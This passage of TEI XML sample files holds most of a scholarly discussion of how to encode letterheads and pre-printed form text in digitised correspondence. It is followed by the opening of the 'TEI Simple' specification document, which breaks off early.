                     Guidelines.</note> The question is whether letterheads fall in these categories
                  or whether this is an overexpansion of the definition and therefore a misuse of
                     <gi>fw</gi>.</p>
               <figure>
                  <head>Example 1: Letter with letterhead (source: Théophile Peyron to Vincent van
                     Gogh, 1 July 1890. Amsterdam, Van Gogh Museum, inv. no. b1064 V/1962, <ref target="http://vangoghletters.org/vg/letters/let895/letter.html">http://vangoghletters.org/vg/letters/let895/letter.html</ref>).</head>
                  <graphic url="../images/pre-printed-parts/example1.png"/>
               </figure>
               <p n="5">A possible encoding using <gi>fw</gi> might look like this (example 1):</p>
               <egXML xmlns="http://www.tei-c.org/ns/Examples">
                     <fw type="letterhead" place="top-left">Maison de
                        Santé<lb/>de<lb/>Saint-Rémy<lb/>de Provence<lb/>Bouches-du-Rhône</fw>
                  </egXML>
               <p n="6">The element <gi>fw</gi> is quite flexible and allows names, places, and
                  addresses to be marked up with <gi>address</gi>, <gi>name</gi>, <gi>placeName</gi>
                  etc. to further specify the content of the letterhead. <gi>figure</gi> can also be
                  included to capture images that are part of the letterhead (for this, see <ref target="#c-2-4">Case 1: Letterheads, issue 4</ref>). There is, however, the
                  question whether <gi>fw</gi> being an inline element is problematic or not as
                  letterheads in their layout are usually set apart from the rest of the text.</p>
               <p n="7">The encoding of a combined letterhead and—as one might call it—letterfooter
                  might look like this:<note n="3" xml:id="fn3">Encoding example (slightly changed)
                     taken from <ref target="http://tei-l.970651.n3.nabble.com/correspondence-encoding-problems-letter-headings-td4029408.html">http://tei-l.970651.n3.nabble.com/correspondence-encoding-problems-letter-headings-td4029408.html</ref>.</note>
               </p>
               
                  <egXML xmlns="http://www.tei-c.org/ns/Examples">
                     <div>
                        <pb n="1"/>
                        <fw type="letterhead">[...]</fw>
                        <opener>[...]</opener>
                        <p>[...]</p>
                        <fw type="letterfooter">[...]</fw>
                        <pb n="2"/>
                        <fw type="letterhead">[...]</fw>
                        <p>[...]</p>
                        <closer>[...]</closer>
                        <fw type="letterfooter">[...]</fw>
                     </div>
                  </egXML>
               <p n="8">Here, you can see this structure in an example encoding of a letter from
                  Johnny Cash to Saul Holiff, written in 1961:<note n="4" xml:id="fn4">Letter from
                     Johnny Cash to Saul Holiff, 6 June 1961: <ref target="https://exhibits.library.uvic.ca/spotlight/holiff/catalog/11-12904">https://exhibits.library.uvic.ca/spotlight/holiff/catalog/11-12904</ref>.
                     Another example for writing paper with letterhead and footer is the letter from
                     Eugene Belmont to Harry Ault, 2 July 1932: <ref target="https://digitalcollections.lib.washington.edu/digital/collection/pioneerlife/id/8634/">https://digitalcollections.lib.washington.edu/digital/collection/pioneerlife/id/8634/</ref>.</note></p>
               <egXML xmlns="http://www.tei-c.org/ns/Examples"><div>
                        <pb n="1"/>
                        <fw type="letterhead">A Few Very Rural, Badly Phrased But Well Meant Words
                           From<lb/>Johnny Cash</fw>
                        <opener>
                           <address>
                              <addrLine>4259 Hayvenhurst Ave</addrLine>
                              <addrLine>[...]</addrLine>
                           </address>
                           <salute>Dear Mr. Volatile,</salute>
                        </opener>
                        <p>Thanks very much for the pictures. [...]</p>
                        <fw type="letterfooter">Singer - Song Writer - Guitar Picker - Cotton
                           Picker</fw>
                        <pb n="2"/>
                        <fw type="letterhead">A Few Very Rural, Badly Phrased But Well Meant Words
                           From<lb/>Johnny Cash</fw>
                        <p>Concerning the cities proposed, [...]</p>
                        <closer>
                           <salute>Gotta go. Thanks again for the pictures. If you need any help
                              from this end, let me know.</salute>
                           <signed>J.R.</signed>
                        </closer>
                        <fw type="letterfooter">Singer - Song Writer - Guitar Picker - Cotton
                           Picker</fw>
                        <pb n="3"/>
                        <fw type="letterhead">A Few Very Rural, Badly Phrased But Well Meant Words
                           From<lb/>Johnny Cash</fw>
                        <postscript>
                           <label>P.S.</label>
                           <p>Gordon went to Las Vegas over the weekend [...]</p>
                           <signed>J.R.</signed>
                        </postscript>
                        <fw type="letterfooter">Singer - Song Writer - Guitar Picker - Cotton
                           Picker</fw>
                     </div>
                  </egXML>
               <p n="9">While this encoding might be suitable for letterheads with names and
                  addresses, it seems not so fitting for pre-printed parts with gaps to be filled in
                  by the letter writer (for this, see <ref target="#c-3-2">Case 2: Pre-printed parts
                     like forms, issue 2</ref>).</p>
            </div>
            <div xml:id="c-2-2">
               <head xml:id="issue1-2">Issue 2: Using <gi>opener</gi> or <gi>head</gi></head>
               <p n="10">As letterheads are often positioned at the top or bottom of the paper, one
                  might think about using the elements <gi>opener</gi> or <gi>closer</gi> with a
                  type attribute that contains, for example, the value letterhead. While
                     <gi>opener</gi> with rend="letterhead" and <gi>closer</gi> with
                  rend="letterhead" before and after the actual <gi>opener</gi> and <gi>closer</gi>
                  might seem like viable solutions, they represent in fact a tag abuse as
                  letterheads are not covered by the definitions of these two elements.<note n="5" xml:id="fn5"><ref target="https://tei-c.org/release/doc/tei-p5-doc/en/html/ref-opener.html">https://tei-c.org/release/doc/tei-p5-doc/en/html/ref-opener.html</ref>, and
                        <ref target="https://tei-c.org/release/doc/tei-p5-doc/en/html/ref-closer.html">https://tei-c.org/release/doc/tei-p5-doc/en/html/ref-closer.html</ref>.
                  </note></p>
               <p n="11">The same is true for the element <gi>head</gi><note n="6" xml:id="fn6"><ref target="https://tei-c.org/release/doc/tei-p5-doc/en/html/ref-head.html">https://tei-c.org/release/doc/tei-p5-doc/en/html/ref-head.html</ref>.</note>
                  which, moreover, cannot capture letterheads at other places than the top of the
                  page. As printed letterheads need not necessarily be on the top of the letter
                  paper above the letter text, they can be positioned at the bottom, on the left or
                  right side, or centered. Therefore, the encoding of letterheads should be
                  independent of their position on the paper but solely based on their content.</p>
            </div>
            <div xml:id="c-2-3">
               <head xml:id="issue1-3">Issue 3: Using <gi>div</gi>, <gi>seg</gi> or
                  <gi>ab</gi></head>
               <p n="12">There is also the possibility of encoding printed letterheads not with an
                  'individual' element but in a more general way as divisions, segments, or even as
                  anonymous blocks. The definitions of these elements <gi>div</gi>, <gi>seg</gi>,
                  and <gi>ab</gi> do not exactly apply to letterheads but could be considered
                  semantically close:</p>
               <cit>
                  <quote><gi>div</gi> (text division) contains a subdivision of the front, body, or
                     back of a text.</quote>
                  <ref target="https://tei-c.org/release/doc/tei-p5-doc/en/html/ref-div.html">(https://tei-c.org/release/doc/tei-p5-doc/en/html/ref-div.html)</ref>
               </cit>
               <cit>
                  <quote><gi>seg</gi> (arbitrary segment) represents any segmentation of text below
                     the 'chunk' level.</quote>
                  <ref target="https://tei-c.org/release/doc/tei-p5-doc/en/html/ref-seg.html">(https://tei-c.org/release/doc/tei-p5-doc/en/html/ref-seg.html)</ref>
               </cit>
               <cit>
                  <quote><gi>ab</gi> (anonymous block) contains any arbitrary component-level unit
                     of text, acting as an anonymous container for phrase or inter level elements
                     analogous to, but without the semantic baggage of, a paragraph.</quote>
                  <ref target="https://tei-c.org/release/doc/tei-p5-doc/en/html/ref-ab.html">(https://tei-c.org/release/doc/tei-p5-doc/en/html/ref-ab.html)</ref>
               </cit>
               <p n="13">The <gi>div</gi> element can be further specified with a type attribute
                  containing "letterhead", "letterfooter", and "pre-printed-form" as possible
                  values, or, in a similar manner, a type attribute containing a general value
                  "pre-printed" accompanied by additional subtypes "letterhead", "letterfooter", or
                  "pre-printed-form". Next to a type attribute, a rend attribute with a value like
                  "pre-printed" also seems possible. However, these encodings pose problems as, for
                  example, <gi>div</gi> and <gi>ab</gi> are not allowed before <gi>opener</gi> or
                  after <gi>closer</gi>. Putting them after <gi>opener</gi> and before
                     <gi>closer</gi>, respectively, is in many cases not a faithful encoding of the
                  source. <gi>seg</gi> is an inline element and cannot be used outside <gi>div</gi>
                  that again is not allowed before <gi>opener</gi> or after <gi>closer</gi>. It
                  should, however, not be put inside <gi>opener</gi> or <gi>closer</gi>,
                  respectively, as it cannot be considered a part of these.</p>
               <p n="14">Another problem arises when dealing with letters several pages long and
                  with a recurring (or even changing) letterhead on each page. An encoding like
                     <egXML xmlns="http://www.tei-c.org/ns/Examples"><div type="letter">
                        <div type="letterhead"/>
                        <div type="letterbody"/>
                     </div>
                  </egXML> would result in several <gi>div</gi> with type="letterbody", one for each
                  single page, interrupted by the recurring <gi>div</gi> with type="letterhead".
                  This seems neither practical nor appropriate.</p>
               <p n="15">Finally, all three elements <gi>div</gi>, <gi>seg</gi>, and <gi>ab</gi>
                  seem rather unspecific regarding the encoding of letterheads, and are probably too
                  general.</p>
            </div>
            <div xml:id="c-2-4">
               <head xml:id="issue1-4">Issue 4: Using <gi>figure</gi></head>
               <p n="16">As letterheads very often include an image or graphical element, and are
                  "typically the result of a lay-out process in the design of the letter paper"<note n="7" xml:id="fn7"><ref target="http://tei-l.970651.n3.nabble.com/correspondence-encoding-problems-letter-headings-td4029408.html">http://tei-l.970651.n3.nabble.com/correspondence-encoding-problems-letter-headings-td4029408.html</ref>.</note>,
                  an encoding using <gi>figure</gi> with type="letterhead" comes to mind. The
                  element <gi>figure</gi> can occur in many different places and can be used in
                  varying depth. On the one hand, it can be used as an empty element for merely
                  signalling the presence of a letterhead. On the other hand, it can contain a
                  description (in <gi>figDesc</gi>), a digital image (in <gi>graphic</gi>), and/or a
                  transcription of its text.</p>
               <figure>
                  <head>Example 2: Letter with image in letterhead (source: Theodor Fontane to
                     Emilie Fontane, 14 August 1856. Potsdam, Theodor-Fontane-Archiv, shelf number
                     TFA V III,4 (Andr), <ref target="https://www.fontanearchiv.de/handschriften/12000250/">https://www.fontanearchiv.de/handschriften/12000250/</ref>. </head>
                  <graphic url="../images/pre-printed-parts/example2.png"/>
               </figure>
               <p n="17">A possible encoding using <gi>figure</gi> might look like this (example
                  2):</p>
               <egXML xmlns="http://www.tei-c.org/ns/Examples">
                     <div type="letter">
                        <figure type="letterhead">
                           <figDesc>The figure shows a drawing of Shakespeare's birthplace in
                              Stratford-upon-Avon, England.</figDesc>
                           <graphic url="fig1.jpg"/>
                           <head>Shakspeare's birth place</head>
                           <p>Published by E. Adams</p>
                        </figure>
                        <opener>Meine liebe Frau. [...]</opener>
                        <p>[...]</p>
                     </div>
                  </egXML>
               <p n="18">Its use is very flexible but the definition suggests that using
                     <gi>figure</gi> like that is rather a tag abuse:</p>
               <cit>
                  <quote><gi>figure</gi> groups elements representing or containing graphic
                     information such as an illustration, formula, or figure.</quote>
                  <ref target="https://tei-c.org/release/doc/tei-p5-doc/en/html/ref-figure.html">(https://tei-c.org/release/doc/tei-p5-doc/en/html/ref-figure.html)</ref>
               </cit>
               <p n="19">Any text contained within <gi>figure</gi> is being understood as
                  "commentary on the figure in the source"<note n="8" xml:id="fn8"><ref target="https://tei-c.org/release/doc/tei-p5-doc/en/html/FT.html#FTGRA">https://tei-c.org/release/doc/tei-p5-doc/en/html/FT.html#FTGRA</ref>.</note>
                  which is not the case in each and every letterhead. Sometimes, there may be text
                  accompanying and commenting the image, as in example 2. However, it usually is the
                  case that text and image are on a parallel level to each other, or the image is an
                  illustration of the text, not the text a commentary on the image. The image might
                  also be just an additional, beautifying feature, like an ornamental decoration as
                  in the letterhead in example 1. Therefore, the text of letterheads should not be
                  subordinate to its image and be transcribed within <gi>figure</gi>. If there is no
                  image at all, as in example 3, an encoding of the letterhead—although perhaps
                  containing a graphical layout—with <gi>figure</gi> seems counterintuitive.</p>
               <figure>
                  <head>Example 3: Letter with letterhead (source: Vincent van Gogh to Theo van
                     Gogh, 24 March 1873. Amsterdam, Van Gogh Museum, inv. no. b6 V/1962, <ref target="http://vangoghletters.org/vg/letters/let006/letter.html">http://vangoghletters.org/vg/letters/let006/letter.html</ref>).</head>
                  <graphic url="../images/pre-printed-parts/example3.png"/>
               </figure>
               <p n="20"><gi>figure</gi> is also not suitable for pre-printed parts with, for
                  example, a place and a dotted line to fill in the date (see <ref target="#c-3-3">Case 2: Pre-printed parts like forms, issue 3</ref>).</p>
               <p n="21">Even though <gi>figure</gi> is not suitable for complete letterheads, it
                  can be used for just the image. It can be part of <gi>fw</gi> and a possible
                  encoding of example 2 might look like this:</p>
               <egXML xmlns="http://www.tei-c.org/ns/Examples"><div type="letter">
                        <fw type="letterhead">
                           <figure>
                              <figDesc>The figure shows a drawing of Shakespeare's birthplace in
                                 Stratford-upon-Avon, England.</figDesc>
                              <graphic url="fig1.jpg"/>
                              <head>Shakspeare's birth place</head>
                              <p>Published by E. Adams</p>
                           </figure>
                        </fw>
                        <opener>Meine liebe Frau. [...]</opener>
                        <p>[...]</p>
                     </div>
                  </egXML>
            </div>
            <div xml:id="c-2-5">
               <head xml:id="issue1-5">Issue 5: Using <gi>layoutDesc</gi></head>
               <p n="22">A basic decision is whether the information of the existence of a
                  letterhead and its content are needed in the transcription or whether abstracting
                  these information and putting them in the meta data is sufficient. The latter may
                  be more convenient for projects that consider the exact transcription of
                  letterheads not semantically important, and for projects with large corpuses of
                  letters with numerous letterheads.</p>
               <p n="23">For including these information in the meta data, <gi>layoutDesc</gi> as
                  part of <gi>objectDesc</gi> is a suitable place:</p>
               <cit>
                  <quote><gi>layoutDesc</gi> (layout description) collects the set of layout
                     descriptions applicable to a manuscript or other object.</quote>
                  <ref target="https://tei-c.org/release/doc/tei-p5-doc/en/html/ref-layoutDesc.html">(https://tei-c.org/release/doc/tei-p5-doc/en/html/ref-layoutDesc.html)</ref>
               </cit>
               <p n="24">A simple encoding example might look like this:</p>
               <egXML xmlns="http://www.tei-c.org/ns/Examples"><objectDesc>
                     <layoutDesc>
                        <layout>A letterhead is printed at the top of the paper with the company's
                           name and address.</layout>
                     </layoutDesc>
                  </objectDesc>
               </egXML>
               <p n="25">Additionally, it might be useful to link the information encoded in
                     <gi>layoutDesc</gi> with the transcription of the letterhead in the
                     <gi>body</gi>. For the letter to Vincent van Gogh in example 1, we recommend an
                  encoding like this in the <gi>teiHeader</gi> as well as in <gi>body</gi>:</p>
               <egXML xmlns="http://www.tei-c.org/ns/Examples"><objectDesc>
                        <layoutDesc>
                           <layout xml:id="lh">A letterhead is printed in the top left corner of the
                              paper with the hotel's name and address in which the sender was
                              staying.</layout>
                        </layoutDesc>
                     </objectDesc>
                     <!-- [...] -->
                     <div>
                        <fw type="letterhead" place="top-left" corresp="#lh">Maison de
                           Santé<lb/>de<lb/>Saint-Rémy<lb/>de Provence<lb/>Bouches-du-Rhône</fw>
                     </div>
                  </egXML>
               <p n="26">For the linking of the letterhead in the <gi>body</gi> part with the
                  header, one cannot use @ref within <gi>fw</gi>, as this is not allowed according
                  to the TEI Guidelines. It is also not allowed to use the <gi>ref</gi> element
                  inside <gi>div</gi>. Therefore, the <gi>ref</gi> element needs to be put inside
                     <gi>fw</gi> containing the transcription of the letterhead. The target
                  attribute then points to the <gi>layout</gi> element in the header:</p>
               <egXML xmlns="http://www.tei-c.org/ns/Examples"><div>
                        <fw type="letterhead" place="top-left">
                           <ref target="#lh">Maison de Santé<lb/>de<lb/>Saint-Rémy<lb/>de
                              Provence<lb/>Bouches-du-Rhône</ref>
                        </fw>
                     </div>
                  </egXML>
            </div>
            <div xml:id="c-2-6">
               <head xml:id="issue1-6">Using <gi>supportDesc</gi></head>
               <p n="27">If one understands the information on pre-printed letterheads on the paper
                  as information about the supporting material on which the letter is written or
                  typed, the element <gi>supportDesc</gi> (as part of <gi>objectDesc</gi>) might
                  first look like a suitable place:</p>
               <cit>
                  <quote><gi>supportDesc</gi> (support description) groups elements describing the
                     physical support for the written part of a manuscript or other object.</quote>
                  <ref target="https://tei-c.org/release/doc/tei-p5-doc/en/html/ref-supportDesc.html">(https://tei-c.org/release/doc/tei-p5-doc/en/html/ref-supportDesc.html)</ref>
               </cit>
               <p n="28">This is a handling of letterheads similar to, for example, watermarks.
                  However, this rather relates to the actual material and its physical aspects<note n="9" xml:id="fn9">Cf. the definition of <gi>support</gi>: "<gi>support</gi>
                     contains a description of the materials etc. which make up the physical support
                     for the written part of a manuscript or other object" <ref target="https://tei-c.org/release/doc/tei-p5-doc/en/html/ref-support.html">https://tei-c.org/release/doc/tei-p5-doc/en/html/ref-support.html</ref>.</note>
                  than to information printed on these materials. Therefore, <gi>supportDesc</gi>
                  cannot be recommended for encoding letterheads.</p>
            </div>
         </div>
         <div xml:id="c-3">
            <head xml:id="forms">Case 2: Pre-printed parts like forms</head>
            <p n="29">Pre-printed parts are a recurring phenomenon in correspondence materials, and
               can be found on telegrams and postcards. A proper markup in order to distinguish
               pre-printed text from handwritten text may be helpful when it comes to research
               questions focusing, for example, on the relation of pre-printed and handwritten text
               in letters and how the first may influence the (genesis of) the latter.</p>
            <figure>
               <head>Example 4: field postcard (source: Franz Marc to Herwarth Walden, 17 April
                  1915, in: DER STURM. Digitale Quellenedition zur Geschichte der internationalen
                  Avantgarde, <ref target="https://sturm-​edition.de/id/Q.01.19150417.FMA.01">https://sturm-​edition.de/id/Q.01.19150417.FMA.01</ref>).</head>
               <graphic url="../images/pre-printed-parts/example4.png"/>
            </figure>
            <div xml:id="c-3-1">
               <head xml:id="issue2-1">Issue 1: Using <gi>ab</gi></head>
               <p n="30">On the textual level, one solution might be the use of the block element
                     <gi>ab</gi><note n="10" xml:id="fn10"><ref target="https://tei-c.org/release/doc/tei-p5-doc/en/html/ref-ab.html">https://tei-c.org/release/doc/tei-p5-doc/en/html/ref-ab.html</ref>.</note>
                  in order to distinguish between pre-printed and non-pre-printed parts. <gi>ab</gi>
                  then might use the attribute–value pair type="pre-printed" for pre-printed parts,
                  type="typed" for text which is produced by a typewriter and type="handwritten" for
                  handwritten text to make the distinction.</p>
               <p n="31">An encoding of the field postcard in example 4 might look as follows
                  (simplified, deletions by sender not encoded):</p>
               <egXML xmlns="http://www.tei-c.org/ns/Examples">
                     <ab type="pre-printed">Absender:</ab>
                     <ab type="handwritten">Vizewachtm. Marc</ab>
                     <ab type="handwritten">Galde<lb/>Fuchs</ab>
                     <ab type="pre-printed">Armeekorps<lb/>Division</ab>
                     <ab type="handwritten"><lb/><lb/>Ersatz</ab>
                     <ab type="pre-printed">Regiment No<lb/>Bataillon<lb/>Abteilung</ab>
                     <ab type="pre-printed">Kompagnie<lb/>Batterie<lb/>Eskadron<lb/>Kolonne</ab>
                     <ab type="pre-printed">Besondere Formationen: (Flieger, Funker usw.)</ab>
                     <ab type="handwritten">Schilling der 1. bayr. Feld-​Art. Rgt. Leichte-​Mun.
                        Kol.</ab>
                  </egXML>
               <p n="32">When encoded like this, we cannot see which handwritten addition belongs to
                  which pre-printed part. One could solve this problem by an encoding like the
                  following (with a different segmentation of the text used in order to group the
                  associated parts):</p>
               <egXML xmlns="http://www.tei-c.org/ns/Examples">
                     <div>
                        <ab type="pre-printed">Absender:</ab>
                        <ab type="handwritten">Vizewachtm. Marc</ab>
                     </div>
                     <div>
                        <ab type="handwritten">Galde</ab>
                        <ab type="pre-printed">Armeekorps</ab>
                     </div>
                     <div>
                        <ab type="handwritten">Fuchs</ab>
                        <ab type="pre-printed">Division</ab>
                     </div>
                     <div>
                        <ab type="pre-printed">Regiment No</ab>
                     </div>
                     <div>
                        <ab type="handwritten">Ersatz</ab>
                        <ab type="pre-printed">Bataillon<lb/>Abteilung</ab>
                     </div>
                     <div>
                        <ab type="pre-printed">Kompagnie<lb/>Batterie<lb/>Eskadron<lb/>Kolonne</ab>
                     </div>
                     <div>
                        <ab type="pre-printed">Besondere Formationen: (Flieger, Funker usw.)</ab>
                        <ab type="handwritten">Schilling der 1. bayr. Feld-​Art. Rgt. Leichte-​Mun.
                           Kol.</ab>
                     </div>
                  </egXML>
               <p n="33">The attribute-value pairs mentioned above do not follow any conventions in
                  TEI; the type attribute can be used in order to annotate completely different
                  phenomena. Thus, this solution seems unspecific with regard to the various ways in
                  which <gi>ab</gi> can be used.</p>
               <p n="34">Cases might arise in which pre-printed parts express a date or a location
                  and, therefore, belong in <gi>opener</gi>.<note n="11" xml:id="fn11">E.g. <ref target="https://doi.org/10.7925/drs1.ivrla_4071">https://doi.org/10.7925/drs1.ivrla_4071</ref>.</note> When using
                     <gi>ab</gi> for the encoding of pre-printed, typed and handwritten parts, it
                  could make sense to place these encodings within <gi>opener</gi>. Since
                     <gi>ab</gi> is not allowed within <gi>opener</gi>, this is another reason not
                  to use <gi>ab</gi>.</p>
            </div>

            <div xml:id="c-3-2">
               <head xml:id="issue2-2">Issue 2: Using <gi>fw</gi></head>
               <p n="35">The forme work element might be fitting for letterheads with names and
                  addresses, as has already been described in <ref target="#c-2-1">Case 1:
                     Letterheads, issue 1</ref>. However, it seems not applicable for pre-printed
                  parts like forms. First, documents like the field postcard in example 4 do not
                  consist of a running head but the pre-printed text rather occurs on a single page
                  and is, therefore, not a continuous feature. Thus, the definition of <gi>fw</gi>
                  cannot be applied to this case. Second, the type attribute could be used to
                  distinguish between pre-printed, handwritten or typed text, but, analogous to the
                  case in Issue 1, there is no such usage convention of @type in TEI.</p>
            </div>
            <div xml:id="c-3-3">
               <head xml:id="issue2-3">Issue 3: Using <gi>figure</gi></head>
               <p n="36">The use of <gi>figure</gi> for pre-printed parts has already been discussed
                  letterheads (see <ref target="#c-2-4">Case 1: Letterheads, issue 4</ref>. There
                  are two main reasons why <gi>figure</gi> should not be used for pre-printed text.
                  First of all, such documents as in example 4 do not contain an illustration,
                  formula, or figure in a narrow sense, so using <gi>figure</gi> is excluded due to
                  its definition. Furthermore—as is the case in issue 1: Using <gi>ab</gi> and issue
                  2: Using <gi>fw</gi>—there is no convention in TEI of using the type attribute to
                  express a distinction between handwritten (or typed) and pre-printed text.</p>
            </div>
            <div xml:id="c-3-4">
               <head xml:id="issue2-4">Issue 4: Using <gi>seg</gi></head>
               <p n="37">The element <gi>seg</gi> marks arbitrary segments within a text. It is
                  designed for the encoder to mark any segmentation of interest.<note n="12" xml:id="fn12"><ref target="https://www.tei-c.org/release/doc/tei-p5-doc/en/html/ref-seg.html">https://www.tei-c.org/release/doc/tei-p5-doc/en/html/ref-seg.html</ref>.</note>
                  The attribute–value pairs described in <ref target="#c-3-1">Case 2, issue 1: Using
                        <gi>ab</gi></ref> could be applied to <gi>seg</gi>. Thus, a possible
                  encoding of the field postcard might be done as follows (simplified, deletions by
                  sender not encoded):</p>
               <egXML xmlns="http://www.tei-c.org/ns/Examples">
                     <ab>
                        <seg type="pre-printed">Absender:</seg>
                        <seg type="handwritten">Vizewachtm. Marc</seg>
                        <seg type="handwritten">Galde<lb/>Fuchs</seg>
                        <seg type="pre-printed">Armeekorps<lb/>Division</seg>
                        <seg type="handwritten"><lb/><lb/>Ersatz</seg>
                        <seg type="pre-printed">Regiment No<lb/>Bataillon<lb/>Abteilung</seg>
                        <seg type="pre-printed">Kompagnie<lb/>Batterie<lb/>Eskadron<lb/>Kolonne</seg>
                        <seg type="pre-printed">Besondere Formationen: (Flieger, Funker usw.)</seg>
                        <seg type="handwritten">Schilling der 1. bayr. Feld-​Art. Rgt. Leichte-​Mun.
                           Kol.</seg>
                     </ab>
                  </egXML>
               <p n="38">There is a clear advantage compared to the usage of <gi>ab</gi>: In the TEI
                  description of <gi>seg</gi>, it is specifically stated that the encoder is free to
                  define his or her own segments of text. But again, as in issue 1: using
                     <gi>ab</gi>, there is no convention in TEI to use @type in order to categorize
                  pre-printed, typed and handwritten text. In addition to that, <gi>seg</gi> is an
                  inline element and therefore cannot be used in the same way as <gi>ab</gi>, for
                  example. The necessity to enclose <gi>seg</gi> with a block element might be
                  problematic.</p>
            </div>
            <div xml:id="c-3-5">
               <head xml:id="issue2-5">Issue 5: Using <gi>handShift</gi>, and proposal of new
                  element <gi>formShift</gi></head>
               <p n="39">Another possible solution is the use of <gi>handShift</gi>. This turns out
                  to cause problems regarding the definition of <gi>handShift</gi> in the TEI
                  Guidelines:</p>
               <cit>
                  <quote><gi>handShift</gi> marks the beginning of a sequence of text written in a
                     new hand, or the beginning of a scribal stint.</quote>
                  <ref target="https://tei-c.org/release/doc/tei-p5-doc/en/html/ref-handShift.html">(https://tei-c.org/release/doc/tei-p5-doc/en/html/ref-handShift.html)</ref>
               </cit>
               <p n="40">As we do not only deal with the shift between different hands but between a
                  hand and a pre-printed form or machine-written part and pre-printed form, the use
                  of <gi>handShift</gi> does not cover all these possible shifts and is, therefore,
                  not an option.</p>
               <p n="41">This is why we propose a new element <gi>formShift</gi>. This new element
                  could then be used at the point of transition from pre-printed text to
                  non-pre-printed text and vice versa. To indicate these different shifts, we would
                  recommend the attribute type with the predefined values handwritten (shift from
                  pre-printed or typed to handwritten), typed (shift from handwritten or pre-printed
                  to typed) and pre-printed (shift from handwritten or typed to pre-printed).
                  Compared to the previous cases, we would have an element created specifically for
                  the task of describing such shifts. The type attribute would then have the sole
                  and specific function to indicate the shifts.</p>
               <p n="42">The description of how the pre-printed parts look like could be encoded in
                     <gi>layoutDesc</gi> as part of <gi>objectDesc</gi>: For example 4, the
                     <gi>layoutDesc</gi> might look like this:</p>
               <egXML xmlns="http://www.tei-c.org/ns/Examples">
                     <objectDesc>
                        <layoutDesc>
                           <p>Turned 90 degrees to the left, there is pre-printed text combined with
                              dotted lines where handwritten entries were made.</p>
                        </layoutDesc>
                     </objectDesc>
                  </egXML>
               
               <p n="43">Here is a possible solution for example 4, using the suggested element
                     <gi>formShift</gi> (simplified, deletions by sender not encoded):</p>
               <egXML xmlns="http://www.tei-c.org/ns/Examples">
                     <objectDesc>
                        <layoutDesc>
                           <p xml:id="pre-printed">Turned 90 degrees to the left, there is
                              pre-printed text combined with dotted lines where handwritten entries
                              were made.</p>
                        </layoutDesc>
                     </objectDesc>
                     <!-- [...] -->
                     <div corresp="#pre-printed">
                        <p>Absender: <formShift type="handwritten"/>Vizewachtm. Marc <lb/>Galde
                           <lb/>Fuchs <formShift type="pre-printed"/>Armeekorps <lb/>Division
                              <formShift type="handwritten"/>
                           <lb/>
                           <lb/>Ersatz <formShift type="pre-printed"/>Regiment No
                           <lb/>Bataillon<lb/>Abteilung <formShift type="handwritten"/>
                           <lb/>
                           <lb/>
                           <formShift type="pre-printed"/>Kompagnie <lb/>Batterie <lb/>Eskadron
                           <lb/>Kolonne </p>
                        <p> Besondere Formationen: (Flieger, Funker usw.) <formShift type="handwritten"/>Schilling der 1. bayr. Feld-​Art. Rgt.
                           Leichte-​Mun. Kol.</p>
                     </div>
                  </egXML>
               <p n="44">The attribute-value pair corresp="pre-printed" would indicate the linking
                  between the pre-printed text and the description in the meta data.</p>
            </div>
            <div type="bibliography">
               <head>Bibliography</head>
               <listBibl>
                  <bibl sameAs="https://www.zotero.org/groups/2248469/encoding_correspondence/items/itemKey/TMLGNZ5L">TEI Consortium, ed. 2019. ‟Correspondence Description.ˮ In <hi rendition="#i">TEI P5: Guidelines for Electronic Text Encoding and Interchange</hi>.
                     Version 3.6.0, 63–65. <ref target="https://www.tei-c.org/release/doc/tei-p5-doc/en/html/HD.html#HD44CD">https://www.tei-c.org/release/doc/tei-p5-doc/en/html/HD.html#HD44CD</ref>.</bibl>
                  <bibl sameAs="https://www.zotero.org/groups/2248469/encoding_correspondence/items/itemKey/A3F94BIQ">TEI Consortium, ed. 2019. ‟Headers, Footers, and Similar Matter.ˮ In <hi rendition="#i">TEI P5: Guidelines for Electronic Text Encoding and
                        Interchange</hi>. Version 3.6.0, 419–420. <ref target="https://www.tei-c.org/release/doc/tei-p5-doc/en/html/PH.html#PHSK">https://www.tei-c.org/release/doc/tei-p5-doc/en/html/PH.html#PHSK</ref>.</bibl>
               </listBibl>
            </div>
         </div>
      </body>
   </text>
</TEI>
</file>

<file path="sample_data/test_files/small/tei/tei-simple-spec.xml">
<?xml version="1.0" encoding="utf-8"?>
<TEI xmlns="http://www.tei-c.org/ns/1.0"
xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
>
  <teiHeader>
    <fileDesc>
      <titleStmt>
        <title>TEI Simple: towards an amenable TEI</title>
        <author>Sebastian Rahtz, Martin Mueller, Brian Pytlik Zillig</author>
      </titleStmt>
      <editionStmt>
        <edition>
          <date>2014-04-21</date>
        </edition>
      </editionStmt>
      <publicationStmt>
        <p>unknown</p>
      </publicationStmt>
      <sourceDesc>
        <p>Converted from a Word document </p>
      </sourceDesc>
    </fileDesc>
    <encodingDesc>
      <appInfo>
        <application ident="TEI_fromDOCX" version="2.15.0">
          <label>DOCX to TEI</label>
        </application>
      </appInfo>
    </encodingDesc>
      <revisionDesc>
	<change n="5" when="2014-05-21" who="Sebastian Rahtz">towards Mellon</change>
	<change n="4" when="2013-12-20" who="Sebastian Rahtz">comments from Lou Burnard</change>
	<change n="3" when="2013-12-08" who="Sebastian Rahtz">rename project, and incorporate comments from TEI Board/Council</change>
	<change n="2" when="2013-12-01" who="Sebastian Rahtz">comments from MM and KH</change>
	<change n="1" when="2013-11-27" who="Sebastian Rahtz">initial version</change>
      </revisionDesc>
  </teiHeader>
  <text>
    <body>
      <div>
        <head><anchor xml:id="SECTION_1001"/>Summary</head>
        <p>TEI Simple aims to define a new <hi rend="italic">highly-constrained</hi> and <hi rend="italic">prescriptive</hi> subset of the Text Encoding Initiative (TEI) Guidelines suited to the representation of early modern and modern books, a formally-defined set of processing rules which permit modern web applications to easily present and analyze the encoded texts, mapping to other ontologies, and processes to describe the encoding status and richness of a TEI digital text.</p>
      </div>
      <div>
        <head><anchor xml:id="SECTION_1002"/>Background</head>
